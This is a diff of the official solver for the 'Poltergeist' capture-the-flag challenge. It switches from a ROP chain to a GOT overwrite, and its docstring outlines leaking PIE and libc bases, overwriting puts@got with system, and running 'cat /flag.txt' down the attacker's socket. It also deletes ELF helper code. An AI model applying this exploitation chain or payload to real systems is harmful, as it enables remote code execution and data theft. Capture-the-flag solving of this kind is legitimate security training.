@@ -4,7 +4,7 @@
 # dependencies = []          # Python 3 standard library only
 # ///
 """
-Automated solver for "Poltergeist" (web) -- full RCE via ROP.
+Automated solver for "Poltergeist" (web) -- RCE via GOT overwrite -> system.
 
 The Séance worker is one long-lived process. It holds an engine-global pointer,
 `g_echo`, into the per-request arena, and clears it when a request ends -- but a
@@ -18,26 +18,25 @@ Poisoning `g_echo` to a known arena slot and placing a forged `Val` there gives:
   * arbitrary WRITE  -- `echo_write($s)` memcpy's attacker bytes to a chosen addr.
 
 There is no flag in memory and no gate to flip: the flag only exists in
-/flag.txt. So the solve is a real pwn against a PIE + Full RELRO + NX + canary,
-*stripped* binary:
+/flag.txt. So the solve is a real pwn against a PIE + NX + canary, GOT-writable
+(no RELRO), *stripped* binary:
 
   1. Pass the wards: solve the proof-of-work; keep payloads WAF-clean.
   2. Leak the PIE base (dangling-descriptor window) -> defeat ASLR.
   3. Arbitrary-read `write@got` -> libc base; read `clientfd`.
-  4. Arbitrary-read libc `environ` -> a stack address; scan for the return
-     address of `process_request` -> its saved-return slot (canary-safe: it sits
-     above the frame that holds the canary).
-  5. Build an open()/read()/write() ROP chain (libc gadgets + raw syscalls) that
-     opens /flag.txt and writes it to our own socket, and `echo_write` it over
-     that return slot. When `process_request` returns, the chain runs and the
-     flag is appended to the response.
+  4. Arbitrary-write `puts@got` <- `system` (the GOT is writable).
+  5. Trigger the `knell` builtin:  knell(cmd) -> puts(cmd) -> system(cmd), with
+     cmd = "cat /flag.txt 1>&<clientfd>", so the flag is written down our socket.
 
-Offsets of the three static globals/sites the chain needs (arena, clientfd and
-`process_request`'s return site) are not in the stripped binary; this official
-solver reads them from the author-only `solve/chall.offsets` (never shipped to
-players, who reverse-engineer them). Everything else -- libc symbols and gadgets
--- is resolved from the handed-out libc.so.6 and leaked at runtime, so the solve
-is ASLR-independent and portable.
+A stack-return ROP is deliberately NOT used: Intel CET / shadow stack on native
+amd64 stops a saved-return overwrite from redirecting control. A GOT overwrite is
+an indirect call, immune to the shadow stack.
+
+Offsets of the static globals/slots (arena, clientfd, write@got, puts@got) are not
+in the stripped binary; this official solver reads them from the author-only
+`solve/chall.offsets` (never shipped to players, who reverse-engineer them).
+libc `write`/`system` come from the handed-out libc.so.6 and bases are leaked at
+runtime, so the solve is ASLR-independent and portable.
 
 Usage:  solve.py <HOST> <PORT>        e.g. solve.py 127.0.0.1 32731
 """
@@ -65,44 +64,13 @@ POW_HDR = [None]
 
 
 # --------------------------------------------------------------------------- #
-#  ELF helpers (pure python): static-symbol table, dynamic symbols, and a
-#  file-offset -> virtual-address mapper for the libc gadget scan.
+#  ELF helpers (pure python): dynamic-symbol lookup in the handed-out libc.
 # --------------------------------------------------------------------------- #
 
 def _read(path):
     with open(path, "rb") as f:
         return f.read()
 
-
-def elf_static_syms(path, names):
-    d = _read(path)
-    if d[:4] != b"\x7fELF":
-        raise ValueError("%s is not ELF" % path)
-    shoff = struct.unpack_from("<Q", d, 0x28)[0]
-    ent = struct.unpack_from("<H", d, 0x3A)[0]
-    num = struct.unpack_from("<H", d, 0x3C)[0]
-    sym = None
-    for i in range(num):
-        o = shoff + i * ent
-        if struct.unpack_from("<I", d, o + 4)[0] == 2:          # SHT_SYMTAB
-            sym = (struct.unpack_from("<Q", d, o + 0x18)[0],
-                   struct.unpack_from("<Q", d, o + 0x20)[0],
-                   struct.unpack_from("<Q", d, o + 0x38)[0],
-                   struct.unpack_from("<I", d, o + 0x28)[0])
-            break
-    if sym is None:
-        raise ValueError("no .symtab (stripped)")
-    off, size, entsz, link = sym
-    stroff = struct.unpack_from("<Q", d, shoff + link * ent + 0x18)[0]
-    want, found = set(names), {}
-    for o in range(off, off + size, entsz or 24):
-        nm = struct.unpack_from("<I", d, o)[0]
-        if nm:
-            e = d.index(b"\x00", stroff + nm)
-            s = d[stroff + nm:e].decode()
-            if s in want:
-                found[s] = struct.unpack_from("<Q", d, o + 8)[0]
-    return found
 
 
 def elf_dynsym(path, name):
@@ -130,30 +98,6 @@ def elf_dynsym(path, name):
                         return val
     raise ValueError("dynsym %s not found in %s" % (name, path))
 
-
-def _load_segments(d):
-    phoff = struct.unpack_from("<Q", d, 0x20)[0]
-    phent = struct.unpack_from("<H", d, 0x36)[0]
-    phnum = struct.unpack_from("<H", d, 0x38)[0]
-    segs = []
-    for i in range(phnum):
-        o = phoff + i * phent
-        if struct.unpack_from("<I", d, o)[0] == 1:              # PT_LOAD
-            segs.append((struct.unpack_from("<Q", d, o + 0x08)[0],   # p_offset
-                         struct.unpack_from("<Q", d, o + 0x10)[0],   # p_vaddr
-                         struct.unpack_from("<Q", d, o + 0x20)[0]))  # p_filesz
-    return segs
-
-
-def libc_gadget(d, segs, pattern):
-    """Virtual offset of `pattern` inside libc (file offset -> vaddr)."""
-    i = d.find(pattern)
-    if i < 0:
-        raise ValueError("gadget %r not in libc" % pattern)
-    for p_off, p_vaddr, p_filesz in segs:
-        if p_off <= i < p_off + p_filesz:
-            return i - p_off + p_vaddr
-    return i
 
 
 # --------------------------------------------------------------------------- #
